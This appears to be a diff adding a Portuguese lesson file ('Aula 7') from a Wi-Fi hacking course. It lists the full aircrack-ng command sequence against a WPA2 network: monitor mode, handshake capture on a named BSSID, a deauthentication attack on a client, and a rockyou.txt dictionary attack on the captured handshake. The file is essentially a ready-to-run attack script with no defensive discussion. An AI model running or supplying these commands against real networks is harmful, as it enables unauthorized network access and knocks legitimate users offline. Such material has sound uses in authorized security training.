@@ -1,0 +1,77 @@
+// Aula 7 - Usando Handshake e brute-force com Wi-Fi WPA2
+
+# airmon-ng start wlan0
+
+# ifconfig
+
+# airodump-ng wlan0mon
+
+# airodump-ng -c 10 --bssid C0:25:E9:80:C1:50 -w captura wlan0mon
+
+# aireplay-ng -0 10 -a C0:25:E9:80:C1:50 -c D0:37:45:C8:17:A9 wlan0mon
+
+# ls
+
+# cd /usr/share/wordlists
+
+# gzip -d rockyou.txt.gz
+
+# ls
+
+# ls -l --block-size=M 
+
+# aircrack-ng -b C0:25:E9:80:C1:50 -w /usr/share/wordlists/rockyou.txt captura-01.cap
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
